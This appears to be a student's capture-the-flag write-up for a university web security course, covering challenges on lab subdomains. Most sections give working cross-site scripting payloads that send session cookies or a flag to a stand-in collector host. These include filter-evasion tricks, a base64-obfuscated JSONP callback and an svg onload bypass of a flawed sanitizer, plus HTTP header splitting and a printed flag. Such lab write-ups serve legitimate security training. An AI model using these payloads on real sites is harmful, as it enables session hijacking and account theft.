# Week 7

## csp subdomain

Challenge 1

- `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' ssl.google-analytics.com". Either the 'unsafe-inline' keyword, a hash ('sha256-R+A6ELN3JPMHUe0uf6qIRigpfMFEvnoKN/xNPiAbOdc='), or a nonce ('nonce-...') is required to enable inline execution.`
  - Console error doesn't appear on Firefox for some reason
  - Add hash to script-src in CSP header
- Image resources blocked (console) - add domains for the images to img-src field in CSP header
- View page source to get nonce attrtibute for script to be executed - add "nonce-[NONCE]" to script-src

Challenge 2

- Add strict-dynamic to script-src to load quote - resource from https://scrapp.quoccabank.com/static/js/get-quote.js 
- Even though nonce for /js/quote-loader.js is included, this file calls the external resource - so strict-dynamic is needed in order to allow quote-loader.js to load additional scripts

## profile subdomain

SVG - report profile image

Upload following svg:

```html
<script>fetch('REQUESTBIN/?q='+document.cookie)</script>
```

Redirect admin to view "image" file

## science-today subdomain

- Comments are vulnerable to XSS
  - `<b>test</b>` works but `<script>alert(1)</script>` does not
  - However, `<SCRIPT>alert(1)</SCRIPT>` works
  - Payload: `<SCRIPT>document.location="REQUESTBIN?q="+document.cookie</SCRIPT>`
  - Flag: `COMP6443{REF_XSS_SO_SIMPLE_STORED..}`
- Query also vulnerable since query in url gets reflected back
  - Words get filtered
  - Payload: `<SCR<SCRIPT>IPT>fetch("REQUESTBIN?q="+document.cookie</SCR</SCRIPT>IPT>)`

## sturec subdomain

Last name search field vulnerable to XSS - '.' and '+' characters not allowed

- JSONP_XSS

  - network analysis - request to /students.jsonp?q=[QUERY]&callback=render

  - try to call other function instead of render

  - Last name search field "query" XSS vulnerable - use `<img src=/students.jsonp?callback=payload/>` to steal cookie

  - `<img src=/students.jsonp?callback=alert(1);render/>` works

  - Trying `<img src=/students.jsonp?callback=fetch('REQUESTBIN?q='+document.cookie);render />` doesn't work because '.' and '+' characters are not allowed

  - Therefore following payload works

    ```html
    <img src=/students.jsonp?callback=fetch(`${atob(BASE64_ENCODED_REQUESTBIN_URL)}${document['cookie']}`);render
    ```

  - Use burp suite to point 'report this page to admin' to the queried page

- STORED_XSS

  - `<b>field_name</b>` around each field - only dcreate field (use Burp Suite to edit automatically generated timestamp on form submission) does not get HTML encoded

  - dcreate field is thus XSS vulnerable, even though looking at the page source code, there is a CSS display: none to hide the field value

  - start `<script>` tag gets removed, as well as the first character

  - fetch - following script gets inserted, but blocked by csp script-src

    `<<script>ascript>document.location='REQUESTBIN?q='%2bdocument.cookie</script>`

  - Use jsonp to send cookie

    ```html
    <<script>ascript src=/students.jsonp?callback=fetch(`${atob(BASE64_ENCODED_REQUESTBIN_URL)}${document['cookie']}`);render></script>
    ```

## report subdomain

- /robots.txt indicates that there is a /view route. Experimenting it turns out there is a base64 encoded session ID from the session cookie (jwt format). Going to /view/session-id allows us to see the WAF filter for sanitising user input.

  ```javascript
  let div = document.querySelector('div[id=report]');
  let contents = atob('PGI+Ym9iPC9iPg==');
  let blacklisted_tags = [
      'script',
      'object',
  ];
  let blacklisted_attribs = [
      /^on.*/i,
  ];
  let sanitize = (parent, el) => {
      // Let's do our magic here!
      console.info('Analysing', el);
      if (blacklisted_tags.includes(el.tagName.toLowerCase())) {
          console.info('Bad element, deleting', el);
          parent.removeChild(el);
          return;
      }
      for (let i = 0; i < el.attributes.length; i++) {
          let attr = el.attributes[i];
          for (let battr of blacklisted_attribs) {
              if (attr.name.search(battr) > -1) {
                  console.info(`Removing ${attr.name} from`, el);
                  el.removeAttribute(attr.name);
                  continue;
              }
              // Check if the src begins with javascript
              if (attr.name === 'src' && attr.value.toLowerCase().indexOf('javascript:') > -1) {
                  console.info('Dangerous src detected, sanitising', attr.value);
                  attr.value = '';
              }
          }
      }
      for (let child of el.children) {
          sanitize(el, child);
      }
      return el;
  };
  
  try {
      let template = document.createElement('template');
      template.innerHTML = contents;
      for (let root of template.content.children) {
          sanitize(template.content, root);
      }
      div.innerHTML = template.innerHTML;
  } catch (e) {
      div.textContent = 'Failed to parse report, XSS protection activated!';
      console.error('jokes they probably fucked up their js', e);
  }
  ```

- From the script above, it can be seen that the template.content.children array can be modified whilst we are iterating through it

- Using a simple example where we are removing each element from an array we are iterating over, it can be seen that the second element won't ever be called within the array. This means if we include at least two children in the content for the report, with the first one meant to be deleted, the second one won't be sanitised. For some reason, locally testing two script tags causes the expected behaviour where the second script child won't be sanitised, but did not execute on the actual report. However, a svg onload worked.

- From this, the following payload successfully sent a request

  ```html
  <script></script>
  <svg onload="fetch(REQUEST_BIN)"/>
  ```

- However, I realised that the cookies were http-only and could not be extracted by a simple document.cookie. Using Burp Suite to intercept /view/[session-id] with the session-id returned from creating the report, and forwarding this request to the repeater, it can be seen that there exists X-Meta: target=[report_title] in the HTTP header returned, as well as the flag in the set-cookie header. Using HTTP response header splitting, it can be seen that adding two carriage returns to the report title pushes the set-cookie header into the body of the response instead of the header, which can then be extracted. 

- Although we cannot enter carriage returns in the report title using the form, the HTTP request can be intercepted to include the `%0D%0A%0D%0A` double carriage return characters at the end of the report title. As such, the cookie can now be found in the HTML body itself. 

- We can search for the flag in the document received and forward it to request bin in order to retrieve the cookie, modifying the report content payload in order to do so.

  ```html
  <script></script>
  <svg onload=fetch('REQUESTBIN/?q='+document.documentElement.outerText.match(/flag=(.*?);/)[1])/>
  ```

## support-v2 subdomain

https://support-v2.quoccabank.com/report/t.js







